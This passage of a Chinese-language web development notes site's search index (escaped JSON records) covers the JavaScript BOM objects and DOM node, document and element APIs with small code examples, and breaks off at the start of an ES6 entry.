\u7684\u4e3b\u8981\u65b9\u9762\u5df2\u7ecf\u7eb3\u5165 HTML5 \u7684\u89c4\u8303\u4e2d\uff0c\u5728\u6b64\u4e4b\u524d\uff0c\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u5bf9 BOM \u7684\u6269\u5c55\u5404\u4e0d\u76f8\u540c\u3002</p>"},{"location":"web/javascript/bom-dom/#window","title":"window \u5bf9\u8c61","text":"<p>BOM \u7684\u6838\u5fc3\u5bf9\u8c61\u662f window\uff0c\u5b83\u8868\u793a\u6d4f\u89c8\u5668\u7684\u4e00\u4e2a\u5b9e\u4f8b\u3002\u5728\u6d4f\u89c8\u5668\u4e2d\uff0cwindow \u6709\u53cc\u91cd\u89d2\u8272\uff1a</p> <ul> <li>window \u662f\u901a\u8fc7 JavaScript \u8bbf\u95ee\u6d4f\u89c8\u5668\u7a97\u53e3\u7684\u4e00\u4e2a\u63a5\u53e3</li> <li>window \u53c8\u662f ECMAScript \u89c4\u5b9a\u7684 Global \u5bf9\u8c61\uff0c\u8fd9\u610f\u5473\u7740\u5728\u7f51\u9875\u4e2d\u5b9a\u4e49\u7684\u4efb\u4f55\u4e00\u4e2a\u5bf9\u8c61\u3001\u53d8\u91cf\u3001\u51fd\u6570\uff0c\u90fd\u4ee5 window \u4f5c\u4e3a\u5176 Global \u5bf9\u8c61\uff0c\u56e0\u6b64\u6709\u6743\u8bbf\u95ee parseInt()\u7b49\u65b9\u6cd5   <pre><code>var age = 29;\nalert(window.age); //29\n</code></pre>   \u5982\u4e0a\uff0c\u5728\u5168\u5c40\u4f5c\u7528\u57df\u5b9a\u4e49\u4e86\u4e00\u4e2a\u53d8\u91cf age\uff0c\u5b83\u88ab\u81ea\u52a8\u5f52\u5728\u4e86 window \u5bf9\u8c61\u540d\u4e0b\u3002</li> </ul> <p>\u6b64\u5916\uff0c\u8fd8\u6709\u5f88\u591a\u7528\u4e8e\u786e\u5b9a\u548c\u4fee\u6539 window \u5bf9\u8c61\u4f4d\u7f6e\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u5982 IE\u3001Safari\u3001Chrome \u90fd\u63d0\u4f9b\u4e86 screenLeft\u3001screenTop \u5c5e\u6027\uff0c\u5206\u522b\u7528\u4e8e\u8868\u793a\u7a97\u53e3\u76f8\u5bf9\u4e8e\u5c4f\u5e55\u5de6\u8fb9\u548c\u4e0a\u8fb9\u7684\u4f4d\u7f6e\u3002</p> <p>\u8fd8\u6709\u8bb8\u591a\u6709\u5173\u7a97\u53e3\u5927\u5c0f\u3001\u5bfc\u822a\u548c\u6253\u5f00\u7a97\u53e3\u7684\u65b9\u6cd5\u3002</p> <p>\u5982 <code>window.open()</code> \u65b9\u6cd5\u65e2\u53ef\u4ee5\u5bfc\u822a\u5230\u4e00\u4e2a\u7279\u5b9a\u7684 URL\uff0c\u4e5f\u53ef\u4ee5\u6253\u5f00\u4e00\u4e2a\u65b0\u7684\u6d4f\u89c8\u5668\u7a97\u53e3\u3002\u8fd8\u6709 <code>close()</code> \u65b9\u6cd5\u53ef\u4ee5\u5173\u95ed\u65b0\u6253\u5f00\u7684\u7a97\u53e3\u3002</p> <p>\u6d4f\u89c8\u5668\u901a\u8fc7 <code>alert(), confirm(), prompt()</code> \u65b9\u6cd5\u53ef\u4ee5\u8c03\u7528\u7cfb\u7edf\u5bf9\u8bdd\u6846\u5411\u7528\u6237\u663e\u793a\u6d88\u606f\u3002</p>"},{"location":"web/javascript/bom-dom/#location","title":"location \u5bf9\u8c61","text":"<p><code>location</code> \u662f\u6700\u6709\u7528\u7684 BOM \u5bf9\u8c61\u4e4b\u4e00\uff0c\u4f7f\u7528\u8be5\u5bf9\u8c61\u53ef\u4ee5\u901a\u8fc7\u7f16\u7a0b\u65b9\u5f0f\u6765\u8bbf\u95ee\u6d4f\u89c8\u5668\u7684\u5bfc\u822a\u7cfb\u7edf\uff0c\u8bbe\u7f6e\u76f8\u5e94\u7684\u5c5e\u6027\uff0c\u53ef\u4ee5\u9010\u6bb5\u6216\u6574\u4f53\u6027\u5730\u4fee\u6539\u6d4f\u89c8\u5668\u7684 URL\u3002</p> <p>\u5b83\u5f88\u7279\u6b8a\uff0c\u5b83\u65e2\u662f <code>window</code> \u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u4e5f\u662f <code>document</code> \u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c\u8c03\u7528 <code>window.location</code> \u548c <code>documet.location</code> \u5f15\u7528\u7684\u662f\u540c\u4e00\u4e2a\u5bf9\u8c61\u3002</p>"},{"location":"web/javascript/bom-dom/#navigator","title":"navigator \u5bf9\u8c61","text":"<p>\u8be5\u5bf9\u8c61\u63d0\u4f9b\u4e86\u4e0e\u6d4f\u89c8\u5668\u6709\u5173\u7684\u4fe1\u606f\uff0c\u5177\u4f53\u6709\u54ea\u4e9b\u4fe1\u606f\uff0c\u4f9d\u636e\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u800c\u5b9a\u3002\u6bd4\u5982 <code>userAgent</code> \u5c5e\u6027\u5b58\u5728\u4e8e\u6240\u6709\u6d4f\u89c8\u5668\u4e2d\u3002</p> <p>BOM \u4e2d\u8fd8\u6709\u4e24\u4e2a\u5bf9\u8c61\uff1ascreen \u548c history\uff0c\u4f46\u5b83\u4eec\u7684\u529f\u80fd\u6709\u9650\u3002screen \u5bf9\u8c61\u4e2d\u4fdd\u5b58\u7740\u4e0e\u5ba2\u6237\u7aef\u663e\u793a\u5668\u6709\u5173\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u4e00\u822c\u53ea\u7528\u4e8e\u7ad9\u70b9\u5206\u6790\u3002history \u5bf9\u8c61\u4e3a\u8bbf\u95ee\u6d4f\u89c8\u5668\u7684\u5386\u53f2\u8bb0\u5f55\u5f00\u4e86\u4e00\u4e2a\u5c0f\u7f1d\u9699\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u636e\u6b64\u5224\u65ad\u5386\u53f2\u8bb0\u5f55\u7684\u6570\u91cf\u3002</p>"},{"location":"web/javascript/bom-dom/#dom","title":"DOM","text":"<p>DOM \u662f\u9488\u5bf9 HTML \u548c XML \u6587\u6863\u7684\u4e00\u4e2a API\u3002\u5176\u63cf\u7ed8\u4e86\u4e00\u4e2a\u5c42\u6b21\u5316\u7684\u8282\u70b9\u6811\uff0c\u5141\u8bb8\u5f00\u53d1\u4eba\u5458\u6dfb\u52a0\u3001\u79fb\u9664\u548c\u4fee\u6539\u9875\u9762\u7684\u67d0\u4e00\u90e8\u5206\u3002</p>"},{"location":"web/javascript/bom-dom/#node","title":"Node \u7c7b\u578b","text":"<p>DOM1 \u5b9a\u4e49\u4e86\u4e00\u4e2a Node \u63a5\u53e3\uff0c\u8be5\u63a5\u53e3\u7531 DOM \u4e2d\u7684\u6240\u6709\u8282\u70b9\u7c7b\u578b\u5b9e\u73b0\u3002\u8be5\u63a5\u53e3\u5728 JS \u4e2d\u662f\u4f5c\u4e3a Node \u7c7b\u578b\u5b9e\u73b0\u7684\uff0c\u9664 IE \u4e4b\u5916\uff0c\u6240\u6709\u6d4f\u89c8\u5668\u90fd\u53ef\u4ee5\u8bbf\u95ee\u5230\u8fd9\u4e2a\u7c7b\u578b\u3002</p> <p>JS \u4e2d\u7684\u6240\u6709\u8282\u70b9\u7c7b\u578b\u90fd\u7ee7\u627f\u81ea Node \u7c7b\u578b\uff0c\u56e0\u6b64\u6240\u6709\u8282\u70b9\u7c7b\u578b\u90fd\u5171\u4eab\u7740\u76f8\u540c\u7684\u57fa\u672c\u5c5e\u6027\u548c\u65b9\u6cd5\u3002</p> <p>nodeType \u5c5e\u6027</p> <p>\u6bcf\u4e2a\u8282\u70b9\u90fd\u6709\u4e00\u4e2a nodeType \u5c5e\u6027\uff0c\u7528\u4e8e\u8868\u793a\u8282\u70b9\u7684\u7c7b\u578b\u3002</p> <p>\u8282\u70b9\u7c7b\u578b\u7531\u5728 Node \u7c7b\u578b\u4e2d\u5b9a\u4e49\u7684\u4e0b\u5217 12 \u4e2a\u6570\u503c\u5e38\u91cf\u6765\u8868\u793a\uff0c\u4efb\u4f55\u8282\u70b9\u7c7b\u578b\u5fc5\u5c45\u5176\u4e00\uff1a</p> <ul> <li>1 Node.ELEMENT_NODE</li> <li>2 Node.ATTRIBUTE_NODE</li> <li>3 Node.TEXT_NODE</li> <li>4 Node.CDATA_SECTION_NODE</li> <li>5 Node.ENTITY_REFERENCE_NODE</li> <li>6 Node.ENTITY_NODE</li> <li>7 Node.PROCESSING_INSTRUCTION_NODE</li> <li>8 Node.COMMENT_NODE</li> <li>9 Node.DOCUMENT_NODE</li> <li>10 Node.DOCUMENT_TYPE_nODE</li> <li>11 Node.DOCUMENT_FRAGMENT_NODE</li> <li>12 Node.NOTATION_NODE</li> </ul> <pre><code>if(someNode.nodeType==Node.ELEMENT_NODE){} //\u5728IE\u4e2d\u65e0\u6548\nif(someNode.nodeType==Node.1){} //\u9002\u7528\u4e8e\u6240\u6709\u6d4f\u89c8\u5668\n</code></pre> <p>nodeName\u3001nodeValue \u5c5e\u6027</p> <p>\u5bf9\u4e8e\u5143\u7d20\u8282\u70b9\uff0cnodeName \u4fdd\u5b58\u7684\u662f\u5143\u7d20\u7684\u6807\u7b7e\u540d\uff0c\u800c nodeValue \u4e3a null\u3002</p> <p>\u8282\u70b9\u5173\u7cfb</p> <p>\u6bcf\u4e2a\u8282\u70b9\u90fd\u6709\u4e00\u4e2a <code>childNodes</code> \u5c5e\u6027\uff0c\u5176\u4e2d\u4fdd\u5b58\u7740\u4e00\u4e2a NodeList \u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u662f\u4e00\u79cd\u7c7b\u6570\u7ec4\u5bf9\u8c61\uff0c\u5b83\u5b9e\u9645\u4e0a\u662f\u57fa\u4e8e DOM \u7ed3\u6784**\u52a8\u6001**\u6267\u884c\u67e5\u8be2\u7684\u7ed3\u679c\u3002\u56e0\u6b64\uff0c\u4ed6\u4e0d\u662f\u7b2c\u4e00\u6b21\u8bbf\u95ee\u65f6\u7684\u77ac\u95f4\u5feb\u7167\uff0c\u800c\u662f\u52a8\u6001\u66f4\u6539\u6709\u751f\u547d\u547c\u5438\u7684\u5bf9\u8c61\u3002</p> <p>\u8bbf\u95ee\u4fdd\u5b58\u5728 NodeList \u4e2d\u7684\u8282\u70b9\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u65b9\u62ec\u53f7\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 item()\u65b9\u6cd5\u3002\u6b64\u5916\uff0c\u53ef\u901a\u8fc7 length \u5c5e\u6027\u8bbf\u95ee\u8fd9\u4e00\u523b\u7684\u957f\u5ea6\u3002</p> <pre><code>var firstChild = someNode.childNodes[0];\nvar secondChild = someNode.childNodes.item(0);\nvar count = someNode.childNodes.length;\n</code></pre> <p>\u6bcf\u4e2a\u8282\u70b9\u90fd\u6709\u4e00\u4e2a <code>parentNode</code> \u5c5e\u6027\uff0c\u8be5\u5c5e\u6027\u6307\u5411\u6587\u6863\u6811\u7684\u7236\u8282\u70b9\u3002\u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u5728\u540c\u4e00\u4e2a <code>childNodes</code> \u4e2d\u7684\u8282\u70b9\u5177\u6709\u5171\u540c\u7684 <code>parentNode</code> \u5c5e\u6027\u3002</p> <p>\u56e0\u6b64\uff0c <code>childNodes</code> \u5217\u8868\u4e2d\u7684\u6bcf\u4e2a\u8282\u70b9\u76f8\u4e92\u4e4b\u95f4\u90fd\u662f\u540c\u80de\u8282\u70b9\u3002</p> <p>\u901a\u8fc7\u4f7f\u7528\u6bcf\u4e2a <code>childNodes</code> \u5217\u8868\u4e2d\u7684\u8282\u70b9\u7684 <code>previousSibling</code> \u548c <code>nextSibling</code> \u5c5e\u6027\uff0c\u53ef\u4ee5\u8bbf\u95ee\u540c\u4e00\u5217\u8868\u4e2d\u7684\u5176\u4ed6\u8282\u70b9\u3002</p> <p>\u7236\u8282\u70b9\u7684 <code>firstChild</code> \u548c <code>lastChild</code> \u5c5e\u6027\u5206\u522b\u6307\u5411\u5176 <code>childNodes</code> \u5217\u8868\u4e2d\u7684\u7b2c\u4e00\u4e2a\u548c\u6700\u540e\u4e00\u4e2a\u8282\u70b9\u3002</p> <p>\u64cd\u4f5c\u8282\u70b9</p> <p>\u56e0\u4e3a\u5173\u7cfb\u6307\u9488\u90fd\u662f\u53ea\u8bfb\u7684\uff0c\u56e0\u6b64 DOM \u63d0\u4f9b\u4e86\u4e00\u4e9b\u64cd\u4f5c\u8282\u70b9\u7684\u65b9\u6cd5\u3002</p> <pre><code>appendChild(newNode) //\u7528\u4e8e\u5411childNodes\u5217\u8868\u672b\u5c3e\u6dfb\u52a0\u4e00\u4e2a\u8282\u70b9\uff0c\u6dfb\u52a0\u540e\u8282\u70b9\u5173\u7cfb\u6307\u9488\u4f1a\u81ea\u52a8\u66f4\u65b0\ninsertBefore(newNode,\u4f5c\u4e3a\u53c2\u7167\u7684\u8282\u70b9) //\u63d2\u5165\u540e\uff0c\u63d2\u5165\u8282\u70b9\u53d8\u6210\u53c2\u7167\u8282\u70b9\u7684\u524d\u4e00\u4e2a\u540c\u80de\u8282\u70b9\nreplaceChild(newNode\uff0c\u8981\u66ff\u6362\u7684\u8282\u70b9)\ncloneNode()\nnormalize() //\u5904\u7406\u6587\u6863\u6811\u7684\u6587\u672c\u8282\u70b9\n</code></pre>"},{"location":"web/javascript/bom-dom/#document","title":"Document \u7c7b\u578b","text":"<p>JS \u901a\u8fc7 Document \u7c7b\u578b\u8868\u793a\u6587\u6863\u3002\u5728\u6d4f\u89c8\u5668\u4e2d\uff0cdocument \u5bf9\u8c61\u662f HTMLDocument\uff08\u7ee7\u627f\u81ea Document \u7c7b\u578b\uff09\u7684\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u8868\u793a\u6574\u4e2a HTML \u9875\u9762\u3002</p> <p>\u800c\u4e14\uff0cdocument \u5bf9\u8c61\u662f window \u5bf9\u8c61\u7684\u4e00\u4e2a\u5c5e\u6027\uff0c\u56e0\u6b64\u53ef\u4ee5\u5c06\u5176\u4f5c\u4e3a\u5168\u5c40\u5bf9\u8c61\u6765\u8bbf\u95ee\u3002</p> <p>Document \u8282\u70b9\u5177\u6709\u4ee5\u4e0b\u7279\u5f81\uff1a</p> <ul> <li>nodeType = 9 (Node.DOCUMENT_NODE)</li> <li>nodeName = \u201c#document\u201d</li> <li>nodeValue = null</li> <li>parentNode = null</li> <li>\u5176\u5b50\u8282\u70b9\u53ef\u80fd\u662f\u4e00\u4e2a DocumentType\u3001Element\u3001ProcessingInstruction\u3001Comment</li> </ul> <p>\u5c5e\u6027</p> <p>document \u6709\u4e24\u4e2a\u5185\u7f6e\u7684\u8bbf\u95ee\u5176\u5b50\u8282\u70b9\u7684\u5feb\u6377\u65b9\u5f0f\uff1a</p> <ul> <li><code>documentElement</code> \uff1a\u8be5\u5c5e\u6027\u59cb\u7ec8\u6307\u5411 HTML \u9875\u9762\u7684 <code>&lt;html&gt;</code> \u5143\u7d20</li> </ul> <pre><code>var html = document.documentElement;\n// html == document.childNodes[0] == document.childNodes.item(0) == document.firstChild\n</code></pre> <ul> <li><code>body</code> \uff1a\u8be5\u5c5e\u6027\u53ef\u4ee5\u53d6\u5f97\u5bf9 <code>&lt;body&gt;</code> \u5143\u7d20\u7684\u5f15\u7528</li> <li><code>doctype</code> \u8be5\u5c5e\u6027\u53ef\u4ee5\u53d6\u7684\u5bf9&lt;!DOCTYPE&gt;\u7684\u5f15\u7528\u3002</li> <li><code>title</code> \uff1a<code>&lt;title&gt;</code> \u5f15\u7528</li> <li><code>URL</code> \uff1a\u5b8c\u6574\u7684 URL\uff0c\u5373\u5730\u5740\u680f\u663e\u793a\u7684 URL</li> <li><code>domain</code> \uff1a\u53ea\u5305\u542b\u9875\u9762\u7684\u57df\u540d</li> <li><code>referrer</code> \uff1a\u94fe\u63a5\u5230\u5f53\u524d\u9875\u9762\u7684\u90a3\u4e2a\u9875\u9762\u7684 URL\uff0c\u65e0\u6765\u6e90\u65f6\uff0c\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002</li> </ul> <p>\u65b9\u6cd5</p> <p>\u6700\u5e38\u89c1\u7684\u5e94\u7528\uff0c\u5c31\u662f\u53d6\u7684\u7279\u5b9a\u7684\u67d0\u4e2a\u6216\u67d0\u7ec4\u5143\u7d20\u7684\u5f15\u7528\uff0c\u7136\u540e\u518d\u6267\u884c\u4e00\u4e9b\u64cd\u4f5c\u3002</p> <ul> <li><code>getElementById()</code> \uff1a\u53ea\u8fd4\u56de\u6587\u6863\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u5143\u7d20\u3002   <pre><code>&lt;div id=\"myDiv\"&gt;Some text&lt;/div&gt;;\nvar div = document.getElementById(\"myDiv\"); // ID\u5fc5\u987b\u4e25\u683c\u5339\u914d\uff0c\u5305\u62ec\u5927\u5c0f\u5199\u3002\u6b64\u5904\u82e5\u4e3amydiv\uff0c\u5219\u9519\u8bef\u3002\n</code></pre></li> <li><code>getElementsByTagName()</code> \uff1a\u8fd4\u56de\u7ed9\u5b9a\u6807\u7b7e\u540d\u7684\u5305\u542b\u96f6\u6216\u591a\u4e2a\u5143\u7d20\u7684 NodeList\u3002NodeList \u662f HTMCollection \u5bf9\u8c61\uff0c\u4e5f\u662f\u52a8\u6001\u96c6\u5408\u3002[\u201dtagName\u201d]\u6216 item()\u8bbf\u95ee\u3002   <pre><code>var images = document.getElementsByTagName(\"img\");\nimages.length;\nimages[0].src; //\u83b7\u53d6\u7b2c\u4e00\u4e2a\u56fe\u50cf\u5143\u7d20\u7684src\u7279\u6027\nimages.item(0);\n</code></pre>   HTMCollection \u5bf9\u8c61\u6709\u4e00\u4e2a namedItem()\u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u53ef\u4ee5\u901a\u8fc7\u5143\u7d20\u7684 name \u7279\u6027\u83b7\u53d6\u96c6\u5408\u4e2d\u7684\u9879\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7[\u201dname\u201d]\u8bbf\u95ee\u3002   <pre><code>&lt;img src=\"myImage.gif\" name=\"myImage\"&gt;\nvar myImage = images.namedItem(\"myImage\");\nvar myImage = images[\"myImage\"];\n</code></pre>   \u5728\u540e\u53f0\uff0c\u5bf9\u6570\u636e\u7d22\u5f15\uff0c\u4f1a\u8c03\u7528 item()\uff0c\u800c\u5bf9\u5b57\u7b26\u4e32\u7d22\u5f15\u5c31\u4f1a\u8c03\u7528 namedItem()</li> <li><code>getElementByName()</code> \uff1a\u8be5\u65b9\u6cd5\u4f1a\u8fd4\u56de\u5e26\u6709\u7ed9\u5b9a name \u7279\u6027\u7684 NodeList\u3002</li> </ul> <p>\u7279\u6b8a\u96c6\u5408</p> <p>\u9664\u4e86\u5c5e\u6027\u548c\u65b9\u6cd5\uff0cdocument \u5bf9\u8c61\u8fd8\u6709\u4e00\u4e9b\u7279\u6b8a\u7684\u7ed3\u5408\uff0c\u8fd9\u4e9b\u96c6\u5408\u90fd\u662f HTMLCollection \u5bf9\u8c61\u3002</p> <ul> <li>document.anchors\uff1a\u6587\u6863\u4e2d\u6240\u6709\u5e26 name \u7279\u6027\u7684 <code>&lt;a&gt;</code> \u5143\u7d20</li> <li>document.forms\uff1a\u6587\u6863\u4e2d\u6240\u6709\u7684 <code>&lt;form&gt;</code> \u5143\u7d20\uff0cdocument.getElementsByTagName(\u201dform\u201d)</li> <li>document.images\uff1a\u6587\u6863\u4e2d\u6240\u6709\u7684 <code>&lt;img&gt;</code> \u5143\u7d20\uff0cdocument.getElementsByTagName(\u201dimg\u201d)</li> <li>document.links\uff1a\u6587\u6863\u4e2d\u6240\u6709\u5e26 href \u7279\u6027\u7684 <code>&lt;a&gt;</code> \u5143\u7d20</li> <li>document.applets\uff1a <code>&lt;applet&gt;</code> \u5143\u7d20\u4e0d\u518d\u63a8\u8350\u4f7f\u7528\u3002</li> </ul> <p>\u6587\u6863\u5199\u5165</p> <p>\u5c06\u8f93\u51fa\u6d41\u5199\u5165\u5230\u7f51\u9875\uff1awrite(), writeln(), open(), close().</p>"},{"location":"web/javascript/bom-dom/#element","title":"Element \u7c7b\u578b","text":"<p>Element \u7c7b\u578b\u7528\u4e8e\u8868\u73b0 XML \u548c HTML \u5143\u7d20\uff0c\u63d0\u4f9b\u4e86\u5bf9\u5143\u7d20\u6807\u7b7e\u540d\u3001\u5b50\u8282\u70b9\u53ca\u7279\u6027\u7684\u8bbf\u95ee\u3002</p> <p>Element \u5177\u6709\u5982\u4e0b\u7279\u5f81\uff1a</p> <ul> <li>nodeType = 1 Node.ELEMENT_NODE</li> <li>nodeName = \u5143\u7d20\u7684\u6807\u7b7e\u540d</li> <li>nodeValue = null</li> <li>parentNode = Document \u6216 Element</li> </ul> <p>\u8981\u8bbf\u95ee\u5143\u7d20\u7684\u6807\u7b7e\u540d\uff0c\u5373\u53ef\u4ee5\u4f7f\u7528 nodeName \u5c5e\u6027\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>tagName</code> \u5c5e\u6027\u3002\u5728 HTML \u4e2d\uff0c\u6807\u7b7e\u540d\u59cb\u7ec8\u90fd\u4ee5\u5168\u90e8\u5927\u5199\u8868\u793a\u3002</p> <pre><code>&lt;div id=\"myDiv\"&gt;&lt;/div&gt;;\nvar div = document.getElementById(\"myDiv\");\ndiv.tagName; //\"DIV\"\ndiv.nodeNmae; //\"DIV\"\n</code></pre> <p>HTML \u5143\u7d20</p> <p>\u6240\u6709 HTML \u5143\u7d20\u90fd\u7531 HTMLElement \u7c7b\u578b\uff08\u4e0d\u662f\u76f4\u63a5\u901a\u8fc7\u8be5\u7c7b\u578b\uff0c\u800c\u662f\u8be5\u7c7b\u578b\u7684\u5b50\u7c7b\uff09\u8868\u793a\uff0cHTMLElement \u7ee7\u627f\u81ea Element \u5e76\u6dfb\u52a0\u4e86\u4e00\u4e9b\u5c5e\u6027\uff0c\u6dfb\u52a0\u7684\u8fd9\u4e9b\u5c5e\u6027\u5206\u522b\u5bf9\u5e94\u4e8e\u6bcf\u4e2a HTML \u5143\u7d20\u4e2d\u90fd\u5b58\u5728\u7684\u4e0b\u5217\u6807\u51c6\u7279\u6027\uff1a</p> <ul> <li>id</li> <li>title</li> <li>lang</li> <li>dir\uff1a\u8bed\u8a00\u7684\u65b9\u5411\uff0c\u201dltr\u201d\u3001\u201drtl\u201d\u3002</li> <li>className\uff1a\u4e0e\u5143\u7d20\u7684 class \u7279\u6027\u5bf9\u5e94\uff0c\u5373\u4e3a\u5143\u7d20\u7684 CSS \u7c7b\u3002\u56e0\u4e3a class \u4e3a ECMAScript \u7684\u4fdd\u7559\u5b57\uff0c\u56e0\u6b64\u91c7\u7528 className\uff0c\u800c\u4e0d\u662f class\u3002</li> </ul> <pre><code>&lt;div id=\"myDiv\" class=\"bd\" title=\"Body text\" lang=\"en\" dir=\"ltr\"&gt;&lt;/div&gt;;\nvar div = document.getElementById(\"myDiv\");\nalert(div.id); // \"myDiv\"\nalert(div.className); // \"bd\"\ndiv.id = \"other_id\"; // \u4fee\u6539\u7279\u6027id\u7684\u503c\n</code></pre> <p>\u65b9\u6cd5</p> <p>\u6bcf\u4e2a\u5143\u7d20\u90fd\u6709\u4e00\u6216\u591a\u4e2a**\u7279\u6027(HTML \u4e2d\u79f0\u4e3a\u5c5e\u6027)**\uff0c\u8fd9\u4e9b\u7279\u6027\u7684\u7528\u9014\u662f\u7ed9\u51fa\u76f8\u5e94\u5143\u7d20\u6216\u5176\u5185\u5bb9\u7684\u9644\u52a0\u4fe1\u606f\u3002\u64cd\u4f5c\u7279\u6027\u7684 DOM \u65b9\u6cd5\u4e3b\u8981\u6709\u4e09\u4e2a\uff1a</p> <ul> <li>getAttribute()\uff1a\u8be5\u65b9\u6cd5\u53ef\u4ee5\u83b7\u53d6\u6807\u51c6\u7279\u6027\uff0c\u4e5f\u53ef\u4ee5\u83b7\u53d6\u81ea\u5b9a\u4e49\u7279\u6027\u3002</li> </ul> <pre><code>alert(div.getAttribute(\"id\");    // \u6548\u679c\u7b49\u4e8ediv.id   \u8fd4\u56de\"myDiv\"\nalert(div.getAttribute(\"class\"); // \u6548\u679c\u7b49\u4e8ediv.className\n\n&lt;div id=\"myDiv\" my_special_attribute=\"hello\"&gt;&lt;/div&gt;\ndiv.getAttribute(\"my_special_attribute\") //\u83b7\u53d6\u81ea\u5b9a\u4e49\u7279\u6027\n</code></pre> <ul> <li>setAttribute()\uff1a\u5982\u679c\u7279\u6027\u4e0d\u5b58\u5728\uff0c\u4f1a\u521b\u5efa\u8be5\u5c5e\u6027\u5e76\u8bbe\u7f6e\u76f8\u5e94\u7684\u503c\u3002   <pre><code>div.setAttribute(\"id\", \"other_id\"); // \u6548\u679c\u7b49\u4e8ediv.id = \"other_id\" \uff0c\u4fee\u6539\u7279\u6027id\u7684\u503c\n</code></pre></li> <li>removeAttribute()</li> </ul> <p>attributes \u5c5e\u6027</p> <p>attributes \u5c5e\u6027\u4e2d\u5305\u542b\u4e00\u4e2a NameNodeMap\uff0c\u4e0e NodeList \u7c7b\u4f3c\uff0c\u4e5f\u662f\u4e00\u4e2a\u52a8\u6001\u7684\u96c6\u5408\u3002</p> <p>\u5143\u7d20\u7684\u6bcf\u4e00\u4e2a\u7279\u6027\u90fd\u7531\u4e00\u4e2a Attr \u8282\u70b9\u8868\u793a\uff0c\u6bcf\u4e2a\u8282\u70b9\u90fd\u4fdd\u5b58\u5728 NameNodeMap \u5bf9\u8c61\u4e2d\uff0c\u8be5\u5bf9\u8c61\u6709\u4e0b\u5217\u65b9\u6cd5\uff1a</p> <ul> <li>getNamedItem(name)\uff1a\u8fd4\u56de nodeName \u5c5e\u6027\u7b49\u4e8e name \u7684\u8282\u70b9</li> <li>removeNamedItem(name)\uff1a\u4ece\u5217\u8868\u4e2d\u79fb\u9664 nodeName \u5c5e\u6027\u7b49\u4e8e name \u7684\u8282\u70b9</li> <li>setNamedItem(node)\uff1a\u5411\u5217\u8868\u4e2d\u6dfb\u52a0\u8282\u70b9\uff0c\u4ee5\u8282\u70b9\u7684 nodeName \u5c5e\u6027\u4e3a\u7d22\u5f15</li> <li>item(pos)\uff1a\u8fd4\u56de\u4f4d\u4e8e\u6570\u5b57 pos \u4f4d\u7f6e\u5904\u7684\u8282\u70b9</li> </ul> <p>\u521b\u5efa\u5143\u7d20</p> <p>document.createElement()\u65b9\u6cd5\u53ef\u4ee5\u521b\u5efa\u65b0\u5143\u7d20\uff0c\u8be5\u65b9\u6cd5\u53ea\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u5373\u8981\u521b\u5efa\u5143\u7d20\u7684\u6807\u7b7e\u540d(\u4e0d\u533a\u5206\u5927\u5c0f\u5199)\u3002</p> <pre><code>var div = document.createElement(\"div\");\ndocument.body.appendChild(div); // \u628a\u65b0\u521b\u5efa\u7684\u5143\u7d20\u6dfb\u52a0\u5230\u6587\u6863\u7684&lt;body&gt;\u5143\u7d20\u4e2d\n</code></pre>"},{"location":"web/javascript/bom-dom/#textcommentcdatasectiondocumenttypeattr","title":"\u5176\u4ed6\u7c7b\u578b\uff1aText\u3001Comment\u3001CDATASection\u3001DocumentType\u3001Attr","text":""},{"location":"web/javascript/bom-dom/#dom_1","title":"DOM \u6269\u5c55","text":"<p>\u5c3d\u7ba1 DOM \u4f5c\u4e3a API \u5df2\u7ecf\u5341\u5206\u5b8c\u5584\u4e86\uff0c\u4f46\u4e3a\u4e86\u5b9e\u73b0\u66f4\u591a\u7684\u529f\u80fd\uff0c\u4ecd\u4f1a\u6709\u4e00\u4e9b\u6807\u51c6\u6216\u4e13\u6709\u7684\u6269\u5c55\u3002</p> <p>\u5bf9 DOM \u7684\u4e24\u4e2a\u4e3b\u8981\u6269\u5c55\u662f Selectors API \u548c HTML5\u3002</p> <p>Selectors API</p> <p>\u4f17\u591a JS \u5e93(\u5982 jQuery)\u4e2d\u6700\u5e38\u7528\u7684\u4e00\u9879\u529f\u80fd\uff0c\u5c31\u662f\u6839\u636e CSS \u9009\u62e9\u7b26\u9009\u62e9\u4e0e\u67d0\u4e2a\u6a21\u5f0f\u5339\u914d\u7684 DOM \u5143\u7d20\u3002</p> <ul> <li>querySelector()\uff1a\u63a5\u53d7\u4e00\u4e2a CSS \u9009\u62e9\u7b26\uff0c\u8fd4\u56de\u4e0e\u8be5\u6a21\u5f0f\u5339\u914d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u82e5\u65e0\uff0c\u8fd4\u56de nul</li> <li>querySelectorAll()\uff1a\u63a5\u53d7\u4e00\u4e2a CSS \u9009\u62e9\u7b26\uff0c\u8fd4\u56de\u5339\u914d\u7684\u6240\u6709\u5143\u7d20\uff0c\u5373\u4e00\u4e2a NodeList \u5b9e\u4f8b\u3002</li> </ul> <pre><code>var body = document.querySelector(\"body\"); // \u53d6body\u5143\u7d20\uff0c\u7c7b\u578b\u9009\u62e9\u5668\nvar myDiv = document.querySelector(\"#myDiv\"); // \u53d6 ID \u4e3a\u201cmyDiv\" \u7684\u5143\u7d20\uff0cid\u9009\u62e9\u5668\nvar selected = document.querySelector(\".selected\"); // class\u9009\u62e9\u5668\nvar img = document.body.querySelector(\"img.button\"); //\n</code></pre>"},{"location":"web/javascript/es6/","title":"ES6","text":""},{"location":"web/javascript/es6/#_1","title":"\u7f29\u5199","text":"<p>\u53c2\u8003\uff1aes6-object</p> <pre><code>// 